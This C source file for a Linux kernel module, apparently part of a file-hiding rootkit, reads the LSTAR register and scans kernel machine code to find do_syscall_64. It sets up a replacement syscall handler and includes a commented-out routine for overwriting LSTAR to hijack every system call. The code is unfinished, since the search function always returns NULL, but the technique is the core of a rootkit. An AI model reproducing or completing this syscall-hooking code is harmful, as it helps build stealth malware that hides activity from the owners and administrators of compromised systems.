#include <linux/kernel.h>
#include <linux/string.h>
#include <asm/nospec-branch.h>
#include <asm/msr-index.h>

#include "filehide_lstar.h"
#include "common.h"

#define SEARCHLEN  512

//Idea: build path from entry_SYSCALL_64_trampoline to do_syscall64 by gathering addresses piece by piece
//(1) JMP_NOSPEC %rdi -> (2) [entry_SYSCALL_64_stage2] jmp entry_SYSCALL_64_after_hwframe -> (3) [entry_SYSCALL_64] call do_syscall_64

//sign-extended mov rdi, imm
static char *movSignExtended = "\x48\xc7\xc7";

//The first call in entry_SYSCALL_64 is the right one, so grabbing it is easy
static char *callNearRelative = "\xE8";

static unsigned long read_msr(unsigned int);
static char *find_do_syscall_64(char *lstar_addr);

void g7_syscall_64(unsigned long, struct pt_regs *);
void (*do_syscall_64)(unsigned long, struct pt_regs *);

void
test_lstar(void)
{   
    char *lstar_addr = (char *)read_msr(MSR_LSTAR);
    
    char *syscall64_base = find_do_syscall_64(lstar_addr);
}

//Only use with multiples of 16..
static void
hexdump(char *addr, int n)
{
    int k = 0;

    DEBUG_INFO("Hexdump:\n");
    while(k <= n) {
        DEBUG_INFO("%02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX",
                addr[k], addr[k + 1], addr[k + 2], addr[k + 3], addr[k + 4], addr[k + 5], addr[k + 6], addr[k + 7], addr[k + 8], addr[k + 9], 
                addr[k + 10], addr[k + 11], addr[k + 12], addr[k + 13], addr[k + 14], addr[k + 15]);
        k += 16;
    }
}

static inline long
sign_extend(int n)
{
    if(n & (1 << 31))
        return n |= 0xFFFFFFFF00000000;

    return n;
}

static char *
find_do_syscall_64(char *lstar_addr)
{
    //Step 1: get address of stage 2 trampoline
    char *stage2_ptr = strnstr(lstar_addr, movSignExtended, SEARCHLEN);

    if(!stage2_ptr)
        return NULL;

    unsigned long stage2_addr = 0;
    memcpy(&stage2_addr, (stage2_ptr + 3), 4); //3 bytes offset to skip opcode

    //Sign-extend manually
    stage2_addr = sign_extend(stage2_addr);

    //Step 2: conveniently, no 'pointer' chasing is necessary, we can just look for the jump opcode from here
    char *syscall64_off_ptr = strnstr((char *)stage2_addr, callNearRelative, SEARCHLEN);

    if(!syscall64_off_ptr)
        return NULL;

    unsigned long syscall64_off = 0;
    memcpy(&syscall64_off, (syscall64_off_ptr + 1), 4); //1 byte offset to skip opcode

    syscall64_off = sign_extend(syscall64_off);

    unsigned long do_syscall_64_addr = (unsigned long)syscall64_off_ptr + syscall64_off;
    hexdump((char *)do_syscall_64_addr, 128);

    DEBUG_INFO("g7_syscall_64 at %lx\n", (unsigned long)g7_syscall_64);

    return NULL;
}

void
g7_syscall_64(unsigned long nr, struct pt_regs *regs)
{
    do_syscall_64(nr, regs);
}

static unsigned long 
read_msr(unsigned int msr)
{
    unsigned int low, high;

    __asm__ volatile (
                    "movl %[msr], %%ecx\n\t"
                    "rdmsr\n\t"
                    "mov %%eax, %[low]\n\t"
                    "mov %%edx, %[high]"
                    : [low] "=r" (low), [high] "=r" (high)
                    : [msr] "r" (msr)
                    : "ecx", "eax", "edx"
    );

    //Get two 32bit values into a 64bit variable
    unsigned long ret = high;
    ret <<= 32;
    ret |= low;

    return ret;
}

// static void
// write_msr(unsigned int low, unsigned int high, unsigned int msr)
// {
//     __asm__ volatile (
//                     "movl $0xc0000082, %%ecx\n\t"
//                     "mov %[low], %%eax\n\t"
//                     "mov %[high], %%edx\n\t"
//                     "wrmsr"
//                     :
//                     : [low] "r" (low), [high] "r" (high)
//                     : "ecx", "eax", "edx"
//     );
// }